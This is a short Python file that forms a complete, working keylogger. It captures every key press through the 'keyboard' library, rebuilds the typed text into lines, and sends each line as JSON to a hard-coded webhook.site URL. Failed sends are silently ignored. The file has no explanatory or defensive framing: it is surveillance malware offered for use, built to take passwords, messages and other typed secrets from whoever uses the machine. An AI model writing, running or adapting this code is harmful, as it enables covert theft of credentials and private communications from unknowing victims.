import keyboard
import requests

webhook_url = "https://webhook.site/bf11b110-cc94-4d1d-96fa-dd7b788f9e9f"

current_line = []
previous_was_command = False

def log_keystroke(event):
    global current_line
    global previous_was_command

    key = event.name
    flag = False
    temp_flag = False

    if key == "space":
        key = " "
    elif key == "tab":
        key = "\t"
    elif key == "backspace":
        if len(current_line) > 0 and not previous_was_command:  # If there is content to delete
            current_line.pop()  # Remove the last character
            return
        elif len(current_line) <= 0:
            return
    elif key in ["shift", "up", "down","left", "right", "caps lock"]:
        return
    elif key in ["alt", "left windows", "ctrl"]:
        if previous_was_command:
            key = "][" + key + " + "
            previous_was_command = False
        else:
            key = "[" + key + " + "
        temp_flag = True
    elif key == "enter":
        key = "\n"
        flag = True
    elif key == ".":
        key = ".\n"
        flag = True
    elif key == "!":
        key = "!\n"
        flag = True
    elif key == "?":
        key = "?\n"
        flag = True
    elif key == ":":
        key = ":\n"
        flag = True
    elif key == ";":
        key = ";\n"
        flag = True

    if previous_was_command:
        key += "]"
    current_line.append(key)

    previous_was_command = temp_flag

    if flag:
        send_to_webhook("".join(current_line))
        current_line = []

def send_to_webhook(data):
    try:
        payload = {"keystrokes": data}
        requests.post(webhook_url, json=payload)
    except Exception as e:
        return

def delete_last_word():
    global current_line
    if " " in current_line:
        last_space_index = len(current_line) - 1 - current_line[::-1].index(" ")
        current_line = current_line[:last_space_index]
    else:
        current_line = []

def main():
    keyboard.on_press(log_keystroke)
    keyboard.wait("esc")

if __name__ == "__main__":
    main()